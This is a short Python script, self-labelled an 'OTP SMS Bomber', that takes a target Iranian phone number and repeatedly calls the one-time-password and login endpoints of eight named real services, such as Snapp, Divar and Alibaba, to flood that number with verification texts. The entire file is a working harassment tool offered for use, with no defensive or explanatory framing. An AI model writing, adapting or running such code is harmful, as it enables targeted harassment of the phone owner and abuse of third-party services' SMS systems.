from argparse import ArgumentParser
from urllib3 import PoolManager
from json import dumps
from time import sleep
from re import search


def send(cellphone):
    http = PoolManager()

    #1. Snapp [OK]
    http.request("post", "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        headers={"Content-Type": "application/json"},
        body=dumps({"cellphone": f"+98{cellphone}"}).encode())

    #2. TAPSI [OK]
    http.request("post", "https://tap33.me/api/v2/user",
        headers={"Content-Type": "application/json"},
        body=dumps({"credential": {"phoneNumber": f"0{cellphone}", "role": "PASSENGER"}}).encode())

    #3. eCharGe [OK]
    http.request("post", "https://www.echarge.ir/m/login?length=19",
        headers={"Content-Type": "application/json"},
        body=dumps({"phoneNumber": f"0{cellphone}"}).encode())

    #4. Divar [OK]
    http.request("post", "https://api.divar.ir/v5/auth/authenticate",
        headers={"Content-Type": "application/json"},
        body=dumps({"phone": f"0{cellphone}"}).encode())

    #5. Alibaba [OK]
    http.request("post", "https://ws.alibaba.ir/api/v3/account/mobile/otp",
        headers={"Content-Type": "application/json"},
        body=dumps({"phoneNumber": f"0{cellphone}"}).encode())

    #6. Torob [OK]
    http.request("GET", "https://api.torob.com/a/phone/send-pin/?phone_number=" + cellphone)

    #7. DrDr [OK]
    http.request("post", "https://drdr.ir/api/registerEnrollment/verifyMobile",
        headers={"Content-Type": "application/json"},
        body=dumps({"phoneNumber": f"0{cellphone}", "userType": "PATIENT"}).encode())

    #8. Filmnet [OK]
    http.request("GET", "https://api-v2.filmnet.ir/access-token/users/98" + cellphone + "/otp")


def spam(args):
    if search(r"9\d{9}$", args.cellphone):
        for time in range(args.times):
            print(f"\rSending SMS {time+1}/{args.times}", end="")
            try:
                send(args.cellphone)
            except KeyboardInterrupt:
                exit()
            sleep(2)
        print("")
    else:
        print("error: invalid cellphone format, format: 9\d{9} e.g. 91234xxxxx")


def main():
    parser = ArgumentParser(prog="asmsb", description="OTP SMS Bomber", epilog="By MH11")
    parser.add_argument("cellphone", help="target cellphone: e.g. 91234xxxxx")
    parser.add_argument("--times", help="count of SMSs (per service!)", type=int, default=10)
    spam(parser.parse_args())


if __name__ == "__main__":
    main()
